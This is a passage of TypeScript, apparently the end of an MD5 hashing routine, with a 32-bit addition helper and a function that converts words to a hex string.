  function add32(a: number, b: number) { return (a + b) & 0xFFFFFFFF; }
  function hex(x: number[]) {
    const chars = "0123456789abcdef";
    let s = "";
    for (let i = 0; i < x.length; i++)
      for (let j = 0; j < 4; j++)
        s += chars.charAt((x[i] >> (j * 8 + 4)) & 0xF) + chars.charAt((x[i] >> (j * 8)) & 0xF);
    return s;
  }
  return hex(md51(str));
}
